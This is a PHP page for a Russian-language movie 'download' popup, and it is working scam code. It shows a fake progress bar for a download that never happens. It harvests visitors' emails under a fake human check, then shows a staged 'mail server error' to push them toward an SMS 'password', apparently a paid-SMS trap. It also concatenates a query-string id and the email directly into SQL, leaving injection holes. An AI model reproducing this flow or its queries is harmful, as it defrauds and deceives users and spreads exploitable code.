<?php

include 'core/Connection.php';
$DB = new DB;

$url = explode("/" ,$_SERVER['QUERY_STRING']);
$id = $url[2];

$step = $url[3];

$DB->query('SELECT * FROM `serial_movie` JOIN `serial_item` ON `serial_item`.`movie_id` = `serial_movie`.`id` WHERE `serial_item`.`id` = '.$id);
$film = $DB->fetch_array();

$DB->query("select * from `billing_type` where `status`='1' and `name`='pseudo' and `payer_id`='1'");
$path = $DB->fetch_array();

require_once('core/MobileDetect.php'); 
$detect = new Mobile_Detect;

if($_COOKIE["ref"] != "52"){
	$statususer = "refferal";
} else {
	$statususer = "not-refferal";
}
      function isValidEmail($email) {
        return preg_match("/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/", $email);
    }
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" style="background:transparent; color: white">
  <head>
    <meta charset="windows-1251" />
    <title>Загрузка фильма</title>
	   <link rel="stylesheet" type="text/css" href="/templates/css/main.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/templates/css/popup.css" media="screen" />
    <script type="text/javascript" src="/templates/js/jquery.js"></script>
<script type="text/javascript">
$(function(){
		if ($(document).width()==600 && $(document).height()==450){
			aud2.play();
		}
	$('.close').click(function(){
		 <?php if ( $detect->isMobile() ) {?>
		    location.href='/';
		 <? } else { ?>
		window.parent.$.fancybox.close();
		<? } ?>
	})
});

</script>
<style type="text/css">
#hidden{
	background-color: #CCCCCC;
	border-radius: 3px 3px 3px 3px;
}
.progress-bar {
	background:none repeat scroll 0 0 #FFFFFF;
	border:1px solid #56577A;
	border-radius:3px 3px 3px 3px;
	margin:5px 35px 5px 5px;
	padding:1px;
	text-align:left;
}
#percentage{
	float:right;
	margin:5px 5px 0 0;
	color:#000;
}
#sample{
}
.bar{
}
</style>
  </head>
  <?php if ( $detect->isMobile() ) {?>
		<body style="background:url('/templates/images/bg013a50.jpg'); color: white" class="body_review">
	<? } else { ?>
		<body style="background:transparent;">
	<? } ?>
    <div>
<?php
if($url[2] != "" && $url[3] == NULL){
?>
      <div class="reg-loading"><?php echo $film['title']; ?></div>
	  <div class="popup-data" style="background:transparent; color: white">
					<div class="popup-block">
						<div id="MsgSuccessAuth"></div><div id="InformationAuth"></div>
						<table id="form_registration_Auth">
							<tbody>
								<tr>
									<td class="promo" style="width:200px; padding-right:0px">
										<center><h2>Скачивание</h2></center>
										<p class="err-text">
											<img src="http://imagees2.pw/i2/<?php echo $film['id']; ?>/<?php echo $film['poster_url']; ?>" alt="" height="215" style="margin-left:20px"/>
										</p>
									</td>
									<td class="reg">
										<h2><?php echo $film['name']; ?> <?php echo $film['title']; ?></h2>
										<p><?php echo substr($film['description'], 0, 600); ?></p>
										<h2>Вы хотите скачать фильм?</h2>
										<input type="button" class="submit btn-next" onclick="location.href='/download/media/<?php echo $film['id']; ?>/2/'" value="Да" style="padding:5px 10px;background: #00b0eb" />
										<input type="button" class="close submit btn-next" value="Нет" style="padding:5px 10px;background: #00b0eb" />
									</td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
<?php
}
if($step == 2){
?>
      <div class="reg-loading">Loading...</div>
	  <div class="popup-data">
			<div class="popup-block" style="background:transparent; color: white" >
				<center><h2>Скачивание фильма на 
				<?php if ( $detect->isMobile() ) {?>
					Ваш гаджет
				<? } else { ?>
					компьютер
				<? } ?>
				</h2></center>
				<div class="content" align="center">
					<p>Пожалуйста подождите. В данный момент идет скачивание фильма на Ваш компьютер</p>
					<p style="color:red; font-size:14px; font-weight:bold">Не закрывайте это окно до окончания загрузки</p>
					<p >Если Вы закроете окно скачивания, прогрес загрузки будет сброшен и Вам прийдется по новой ждать окончания загрузки</p>
					<h2>Размер файла: 1,8 ГБ</h2>
					<h2 style="font-size:12px;">Осталось ждать:<span id="min_left">12</span> мин.</h2>
					<br />
					<div id="hidden" style="visibility: visible;overflow:hidden;">
						<div id="percentage">0%</div>
							<div class="progress-bar">
								<div class="bar" id="sample" style="background-color: rgb(0, 102, 204); border-radius: 2px 2px 2px 2px; box-shadow: 0pt 0pt 5px black inset; width: 0%;"><span style="visibility:hidden;">0%</span></div>
							</div>
						</div>
					<span id="min_btn">
						<input type="button" class="submit btn-next" onclick="location.href='/download/media/<?php echo $film['id']; ?>/3/'" value="Отменить загрузку" style="padding:5px 10px;background: #00b0eb" />
					</span>
				</div>
			</div>
		</div>
      <script type="text/javascript">
      var seconds = 720,
      interval = setInterval(function(){
      	seconds--;
      	var minutes = Math.ceil(seconds / 60),
      		percent = Math.ceil(100 * (720 - seconds) / 720);
      	$('#min_left').html(minutes);
      	$('#percentage').html(percent + '%');
      	$('#sample').css({width : percent + '%'});
      	if(percent >= 90){
      		$('#min_btn').html('<blink><input type="button" class="submit btn-next" onclick="location.href=\'/download/media/<?php echo $film['id']; ?>/4/\'" value="Продолжить закачку" style="padding:5px 10px;background: #00b0eb" /></blink>');
      		clearInterval(interval);
      	}
      }, 1000);
      </script>
<?php }
if($step == 3){
?>
      <div class="reg-loading">Loading...</div>
      <div class="content" align="center" style="color:black; height: 250px; background:transparent; color: white">
        <br /><br /><br /><br />
        <h2>Действительно хотите отменить загрузку?</h2>
		<p style="color: red"><b>Отмена загрузки приведет к потере прогресса загруженных данных</b></p>
        <br /><br />
        <input type="button" class="close submit btn-next" value="Да" style="padding:5px 10px;" />
        <input type="button" class="submit btn-next" onclick="location.href='/download/media/<?php echo $film['id']; ?>/2/'" value="Нет" style="padding:5px 10px;background: #00b0eb" />
      </div> <!-- .ca -->
<?php
}
if($step == 4){
  if(isset($_POST['email'])){
    if(trim($_POST['email']) != '' && isValidEmail($_POST['email'])){
        mysql_query("Insert into `emails` set `email` = '".trim($_POST['email'])."'");
        echo '<meta http-equiv="Refresh" content="0; url=/download/media/'.$film['id'].'/5/">';
    } else {
        echo '<b style="color: red">Не валидный email</b>';
    }
  }
?>
      <div class="reg-loading">Регистрация</div>
      <div class="content" align="center">
        <br /><br /><br /><br />
        <div style="font-size:13px;font-family:sans-serif;">
          <form action="/download/media/<?php echo $film['id']; ?>/4/" method="post">
            Для продолжения и завершения скачивания,
            <br />
            необходимо подтвердить что вы человек, а не поисковый робот
            <br />
            Пройдите простую регистрацию
            <br />
            Просто введите свой e-mail, на который мы вышлем пароль:
            <br /><br />
            <input type="text" class="text" name="email" id="email" size="20" value=""  style="padding:5px 10px;"/>
            <br />
            Формат: xxxx@xxxx.xx
            <br /><br />
            <input type="submit" class="submit btn-next" value="Отправить"  style="padding:5px 10px;"/>
			      <input type="button" class="submit btn-next" value="Отправить пароль СМСкой на телефон" onClick="parent.$.fancybox({href : '#modtest'});" style="padding:5px 10px;background: #00b0eb"/>
          </form>
        </div>
      </div> <!-- .ca -->
<?php
}
if($step == 5){ ?>
      <script type="text/javascript">
      setTimeout(function(){ $('#page2, #page1').toggle(); }, 7000);
      </script>
      <div id="page1">
        <div class="reg-loading">Регистрация</div>
        <div class="content" align="center">
          <br /><br /><br /><br />
          Подождите, идет отправка письма
          <br /><br />
          <img src="/templates/images/loading.gif" alt="" />
        </div> <!-- .ca -->
      </div>
      <div id="page2" style="display:none;">
        <div class="reg-loading">Ошибка почтового сервера!</div>
        <div class="content" align="center">
          <div style="font-size: 16px;">
            <br /><br /><br /><br />
            <img src="/templates/images/important.png" alt="" />
            <br />
            Не удалось отправить письмо на указанный адрес.
            <br />
            Хотите получить пароль в смс сообщении?
            <div style="height:0;overflow:hidden;border-top:2px dotted #ccc;margin:10px 25px;"></div>
            <input type="button" class="submit btn-next" onClick="parent.$.fancybox({href : '#modtest'});" value="Да! Получить пароль" style="padding:5px 10px;" />
            <input type="button" class="close submit btn-next" value="Нет, я не буду смотреть фильм" style="padding:5px 10px;" />
          </div>
        </div> 
      </div>
<?php

}
?>
    </div>
  </body>
</html>